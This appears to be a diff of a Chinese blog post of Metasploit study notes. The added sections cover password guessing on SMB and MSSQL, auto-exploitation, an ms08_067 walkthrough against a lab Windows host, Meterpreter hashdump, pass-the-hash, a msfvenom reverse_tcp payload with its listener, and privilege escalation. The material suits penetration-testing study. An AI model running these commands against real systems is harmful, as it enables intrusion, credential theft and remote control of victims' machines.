@@ -22,7 +22,7 @@
 
 
     <meta name="author" content="莲的思念">
-    <meta name="description" content="一款优秀的渗透测试框架。 一些专业术语 渗透测试(exploit) 指由攻击者或渗透测试师利用系统、应用或服务中的安全漏洞进行的攻击行为。 攻击载荷(payload) 期望目标系统在被渗透之后去执行的代码。比如反弹式shell、bind shell等 shellcode 在渗透攻击时作为攻击载荷的一组机器指令。通常用汇编语言编写。大多数情况下，目标系统执行了Shellcode这一组指令后，才会提供一个命令行shell或meterpreter shell。 监听器 是Metasploit中用来等待连入网络连接的组件，比如攻击主机等待被渗透的目标系统来连接，并负责处理这些连接。 Metasploit用户接口 MSF终端 交互式，msfconsole MSF命令行 msfcli，脚本的处理与其他命令行工具的输入输出操作。 Armitage 图形化工具 Metasploit功能程序 对Metasploit中的一些特殊功能直接进行访问的接口。 MSF攻击载荷生成器 能够生成shellcode、可执行代码等，可以让它们在框架软件以外的渗透代码中使用。Shellcode可以生成包括C、JavaScript等格式。命令为msfpayload。（在新版MSF中将msfpayload和msfencode合并成了msfvenom。 MSF编码器 msfpayload生成的shellcode中可能包含了一些null字符，这些字符会被认为是字符串的结束，从而导致代码被截断。另外为了免杀，所以需要使用到MSF编码器来逃避检测以及避免坏字符 ...">
+    <meta name="description" content="一款优秀的渗透测试框架。 Metasploit基础 一些专业术语 渗透测试(exploit) 指由攻击者或渗透测试师利用系统、应用或服务中的安全漏洞进行的攻击行为。 攻击载荷(payload) 期望目标系统在被渗透之后去执行的代码。比如反弹式shell、bind shell等 shellcode 在渗透攻击时作为攻击载荷的一组机器指令。通常用汇编语言编写。大多数情况下，目标系统执行了Shellcode这一组指令后，才会提供一个命令行shell或meterpreter shell。 监听器 是Metasploit中用来等待连入网络连接的组件，比如攻击主机等待被渗透的目标系统来连接，并负责处理这些连接。 Metasploit用户接口 MSF终端 交互式，msfconsole MSF命令行 msfcli，脚本的处理与其他命令行工具的输入输出操作。(在新版中合并了msfcli接口，使用msfconsole -x "命令" 或 msfconsole -r <file>的形式。举例来说： msfconsole -x "use exploit/windows/smb/ms08_067_netapi;set ...">
   <meta name="tags" contents="">
 </head>
 
@@ -59,32 +59,42 @@
     </ul>
     <div class="post-content">
       <p>一款优秀的渗透测试框架。</p>
-<h1> 一些专业术语 </h1>
+<h1> Metasploit基础 </h1>
 
-<h4> 渗透测试(exploit) </h4>
+<h2> 一些专业术语 </h2>
+
+<h3> 渗透测试(exploit) </h3>
 
 <p>指由攻击者或渗透测试师利用系统、应用或服务中的安全漏洞进行的攻击行为。</p>
-<h4> 攻击载荷(payload) </h4>
+<h3> 攻击载荷(payload) </h3>
 
 <p>期望目标系统在被渗透之后去执行的代码。比如反弹式shell、bind shell等</p>
-<h4> shellcode </h4>
+<h3> shellcode </h3>
 
 <p>在渗透攻击时作为攻击载荷的一组机器指令。通常用汇编语言编写。大多数情况下，目标系统执行了Shellcode这一组指令后，才会提供一个命令行shell或meterpreter shell。</p>
-<h4> 监听器 </h4>
+<h3> 监听器 </h3>
 
 <p>是Metasploit中用来等待连入网络连接的组件，比如攻击主机等待被渗透的目标系统来连接，并负责处理这些连接。</p>
-<h1> Metasploit用户接口 </h1>
+<h2> Metasploit用户接口 </h2>
 
 <h3> MSF终端 </h3>
 
 <p>交互式，msfconsole</p>
 <h3> MSF命令行 </h3>
 
-<p>msfcli，脚本的处理与其他命令行工具的输入输出操作。</p>
+<p>msfcli，脚本的处理与其他命令行工具的输入输出操作。(在新版中合并了msfcli接口，使用<code>msfconsole -x "命令"</code> 或 <code>msfconsole -r &lt;file&gt;</code>的形式。举例来说：</p>
+<div class="highlight"><pre>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi;set RHOST ...;set PAYLOAD ...;run&quot;
+或是将命令写在文件中，用msfconsole -r运行
+</pre></div>
+
+
 <h3> Armitage </h3>
 
 <p>图形化工具</p>
-<h1> Metasploit功能程序 </h1>
+<h3> MSF更新 </h3>
+
+<p>去www.metasploit.com官网下载Metasploit Framework进行更新。</p>
+<h2> Metasploit功能程序 </h2>
 
 <p>对Metasploit中的一些特殊功能直接进行访问的接口。</p>
 <h3> MSF攻击载荷生成器 </h3>
@@ -98,18 +108,18 @@
 <p>在尝试了解汇编代码含义时是非常有用的工具，特别是在进行渗透代码开发时，需要对给定的汇编命令找出其opcode操作码时，就可以使用这个程序来帮助。</p>
 <h1> 情报搜集 </h1>
 
-<h3> 被动情报搜集 </h3>
+<h2> 被动情报搜集 </h2>
 
 <ul>
 <li>whois查询：后面可以使用域名或IP作为参数</li>
 <li>Netcraft：网页页面工具。http://searchdns.netcraft.com</li>
 <li>nslookup：根据type可以搜索其邮箱服务器</li>
 </ul>
-<h3> 主动情报搜集 </h3>
+<h2> 主动情报搜集 </h2>
 
-<h4> Nmap </h4>
+<h3> Nmap </h3>
 
-<h4> 在MSF中使用数据库 </h4>
+<h3> 在MSF中使用数据库 </h3>
 
 <p>MSF现在默认数据库为PostgreSQL，也只支持这个数据库。首先启动PostgreSQL服务。然后在msf控制台下输入<code>db_status</code>查看是否连接数据库。若无连接，则输入<code>db_connect 用户名:密码@localhost/数据库名</code>。其中的内容在<code>/opt/metasploit/apps/pro/ui/config/database.yml</code>中。若没有则从头创建：</p>
 <div class="highlight"><pre>su - postgres
@@ -153,13 +163,13 @@ msf auxliary(ipidseq)&gt; nmap -sI 192.168.1.109 10.10.10.129
 <h2> 使用OpenVAS进行扫描 </h2>
 
 <p>OpenVAS能够基于C/S和B/S架构进行工作。一套完整的openVAS系统包裹服务器端、客户端的多个组件：</p>
-<h5> 服务器组件 </h5>
+<h3> 服务器组件 </h3>
 
 <ol>
 <li>openvas-scanner：负责调用各种漏洞检测插件，完成实际的扫描任务</li>
 <li>openvas-manager：负责分配扫描任务，并根据扫描结果生成报告。同时也包括用户方面的授权等</li>
 </ol>
-<h5> 客户端组件 </h5>
+<h3> 客户端组件 </h3>
 
 <ol>
 <li>openvas-cli：负责提供从命令行访问openVAS服务层程序。包括openvasmd、openvassd等。</li>
@@ -169,6 +179,106 @@ msf auxliary(ipidseq)&gt; nmap -sI 192.168.1.109 10.10.10.129
 <p>除了上述组件外还有一个漏洞测试插件更新。OpenVAS系统的插件来源主要有两个途径：一是官方提供的NVT免费插件，二是Greenbone公司提供的商业插件。</p>
 <p>初始安装：菜单中的openVAS-&gt;openVAS initial setup。之后会下载NVT资源。若安装过程中出现错误：openvas-check-setup，然后根据提示进行修复。通过使用<code>openvasmd --user=admin --new-password=&lt;password&gt;</code>来修改安装时设置的管理员随机密码。通常openVAS服务使用的默认端口是9392。从gsd(web端)进入需要使用https协议。</p>
 <h2> 专用漏洞扫描器 </h2>
+
+<h3> 验证SMB登录 </h3>
+
+<p>可以使用SMB登录扫描器对大量的主机的用户名和密码进行猜解，但是这种动静很大，而且会在Windows主机的日志中留下痕迹。使用use命令选择smb_login模块，可以指定用户名、密码、用户名列表或是密码列表</p>
+<h3> 扫描开放的vnc空口令 </h3>
+
+<p>使用scanner/vnc/vnc_none_auth。新版本的vnc已不再允许空口令。</p>
+<h3> 扫描开放的X11服务器 </h3>
+
+<p>使用scanner/x11/open_x11</p>
+<h2> 利用扫描结果进行自动化攻击 </h2>
+
+<p>MSF的Autopwn能够自动选择目标并利用已开放的端口或漏洞扫描结果，对目标进行自动化的渗透攻击。可以利用大多数漏洞扫描器的结果（比如Nessus、Openvas）来执行Autopwn。因为新版本的MSF已经取消了db_autopwn，需要先下载然后db_autopwn.rb文件放在/usr/share/metasploit/plugins目录下。</p>
+<p>使用时先连接数据库，然后用db_import导入扫描结果。db_autopwn包含一系列参数：对所有目标发起攻击(e)，显示所有匹配的模块(t)，使用反弹Shell的攻击载荷(r)，根据漏洞选择攻击模块(x)，根据开放端口选择攻击模块(p)。如果攻击成功，返回一个被控制的计算机的Shell。</p>
+<h1> 渗透攻击之旅 </h1>
+
+<h2> 渗透攻击基础 </h2>
+
+<h3> msf > show exploits </h3>
+
+<p>显示所有可用的渗透攻击模块</p>
+<h3> msf > show auxiliary </h3>
+
+<p>显示所有辅助模块，它们可以是扫描器、DOS工具、Fuzz测试器及其其他。</p>
+<h3> msf> show options </h3>
+
+<p>参数是保证各个模块正常运行所需额各种设置。若选择一个模块就会显示这个模块所需的参数，如果没有选择模块就会显示全局参数。</p>
+<h3> msf> show payloads </h3>
+
+<p>当选择了一个模块后就会显示去此模块兼容的攻击载荷</p>
+<h3> msf> show targets </h3>
+
+<p>MSF的渗透攻击模块通常可以列出受到漏洞影响目标系统的类型。举例来说，由于针对MS08_067漏洞的攻击依赖于硬编码的内存地址，所以这个攻击仅针对特定的操作系统版本，且只适用于特定的补丁级别、语言版本以及安全机制实现。攻击是否成功取决于目标Windows系统的版本，有时候自动选择目标可能无法正常工作，容易触发错误行为，通常会导致远程服务崩溃。通常攻击模块会根据目标系统的指纹信息自动选择操作系统版本进行攻击，不过最好还是人工选择目标操作系统，这样才能避免触发错误。</p>
+<h3> info </h3>
+
+<p>显示模块的详细信息、参数说明和所有可用的目标操作系统。</p>
+<h3> set unset </h3>
+
+<p>set对参数进行设置，unset取消设置。</p>
+<h3> setg unsetg </h3>
+
+<p>对全局参数进行设置，像LHOST等。save进行保存。</p>
+<h2> 攻击Windows主机 </h2>
+
+<p>目标机为Windows SP2简体中文版。首先开启msfconsole。然后进行nmap扫描，发现smb的漏洞，即可以使用ms08_067。</p>
+<div class="highlight"><pre>metasploit&gt; use exploit/windows/smb/ms08_067
+metasploit&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+metasploit&gt; set RHOST 192.168.56.130
+metasploit&gt; set LHOST 192.168.56.128
+metasploit&gt; set LPORT 8080 #设置防火墙可能会允许通行的端口
+metasploit&gt; set target 10  #手动设置OS版本，否则可能会不成功
+metasploit&gt; run
+</pre></div>
+
+
+<p>成功的话便可以取得会话。因为目标机为中文，而MSF不支持中文显示，所以取得shell时中文会显示乱码。解决方法：可以设置目标机的cmd的代码页，右键cmd窗口-&gt;默认值，修改代码页为英文。</p>
+<p>注：若显示Connection refused，检查目标机器ICS服务是否可以打开，如果不能打开，在cmd输入<code>netsh winsock reset</code>。</p>
+<h2> 全端口攻击载荷：暴力猜解目标开放的端口 </h2>
+
+<p>有些时候，目标主机反弹连接的端口可能被防火墙过滤了，导致无法成功，可以猜解其他没有被过滤的端口进行连接。MSF的这个模块会对所有可用的端口进行尝试，直到发现其中一个是放行的。</p>
+<h2> 资源文件 </h2>
+
+<p>资源文件是MSF内包含一系列自动化命令的脚本文件。这些文件实际上是一个可以在MSF终端中执行的命令列表，列表中的命令将按顺序执行。使用<code>resource</code>命令载入资源文件。</p>
+<h1> Meterpreter </h1>
+
+<p>Meterpreter通常作为漏洞溢出后的攻击载荷所使用，攻击载荷在触发漏洞后能够返回给我们一个控制通道。Meterpreter作为Metasploit的一个模块可以调用Metasploit的一些功能，对目标系统进行更为深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等。</p>
+<h2> 攻陷Windows XP目标机 </h2>
+
+<p>首先使用Nmap扫描，可以看到有MSSQL服务开启。通常情况下MSSQL默认开启TCP的1433端口和UDP的1434端口。但新版本的MSSQL允许安装到随机分配的TCP端口，而UDP的端口则没有变化，可以通过UDP端口来查询获取SQL服务的TCP动态端口。可以使用mssql_ping模块来找出MSSQL服务端口。</p>
+<p>MSSQL在初次安装的时候需要用户创建sa或系统管理员用户，由于有些管理员在安装的时候没有安全意识，常常会设置弱密码或空密码，因此可以使用mssql_login模块猜解密码，可以使用Fasttrack的wordlist字典。</p>
+<p>以sa管理员账户权限运行MSSQL时，可以执行xp_cmdshell存储过程，该存储过程允许我们直接与底层操作系统进行交互并执行命令。xp_cmdshell是SQL Server中缺省装载的内建存储程序，可以通过MSSQL调用xp_cmdshell直接来执行命令，可以将其理解为一个可以执行任意命令的操作系统超级用户命令行。而MSSQL通常是以SYSTEM级别权限运行的，所以一旦获得sa用户，就可以同时以管理员身份访问MSSQL和底层操作系统。</p>
+<p>为了在系统中注入payload，需要与xp_cmdshell进行交互，添加本地管理员并通过一个可执行文件来植入攻击payload，可以使用mssql_payload模块来植入任意Metasploit的payload。（XP中文版会失败）</p>
+<h2> Meterpreter基本命令 </h2>
+
+<ol>
+<li>screenshot：截屏。</li>
+<li>sysinfo: 获取系统运行平台</li>
+<li>hashdump模块：提取系统的用户名和密码的哈希值。Windows中一般存储密码的方式有两种：LM和NTLM。LM将密码分成7个字符一组的密码，然后转换成哈希值存储。而NTLM则是直接将密码整个进行哈希存储。LM最多支持14字符，若超过14字符则自动转为NTLM存储。LM处为空，显示的哈希值为<code>aad3b435</code>开头。</li>
+</ol>
+<h2> 传递哈希值 </h2>
+
+<p>有些时候不能在可接收时间内将明文密码破解出来，可以使用哈希值传递技术，只要知道哈希值就够了，无需知道明文密码。可以使用<code>windows/smb/psexec</code>模块来实现。</p>
+<p>实验过程中可能出现的问题：首先设置SMBUSER和SMBPASS，SMBPASS包含LM和NTLM。若出现STATUS_LOGON_FAILURE错误，则在目标机的本地安全策略中设置：<code>本地策略-&gt;安全选项-&gt;网络访问：本地用户的账户共享和安全模式-&gt;改成：经典-本地用户以自身身份验证</code>。若出现STATUS_ACCOUNT_RESTRICTION，则目标机的用户需设置密码。</p>
+<h2> 权限提升 </h2>
+
+<p>首先在目标机器上新建一个用户，Windows下新建的用户都是受限制的用户，即自动归为Users组。然后使用msfvenom生成一个payload。</p>
+<div class="highlight"><pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.128 LPORT=443 -f exe -o a.exe
+</pre></div>
+
+
+<p>将生成的文件通过smb传给目标机（用ftp上传似乎会出错，是否有坏字符？）。然后在攻击机上启动msfconsole。</p>
+<div class="highlight"><pre>msf&gt;use exploit/multi/handler
+msf&gt;set PAYLOAD windows/meterpreter/reverse_tcp   #和前面使用的payload相同
+msf&gt;set LHOST 192.168.56.128
+msf&gt;set LPORT 443                                 #用于在攻击机上进行监听
+msf&gt;run
+</pre></div>
+
+
+<p>之后等待目标机上的程序运行就能传递Meterpreter。如果运行程序的是受限制的用户就需要进行提权。在Meterpreter下载入priv扩展（一般默认已经加载了），然后输入<code>getsystem</code>尝试提权。如果getsystem失败可以尝试其他的模块，比如<code>exploit/windows/local/ms14_058_track_popup_menu</code>或者<code>exploit/windows/local/ms10_015_...</code>等，将受限制的会话当作参数传入，在设置了PAYLOAD后会得到一个SYSTEM级别的会话。</p>
     </div>
   </div>
   <hr class="separator">
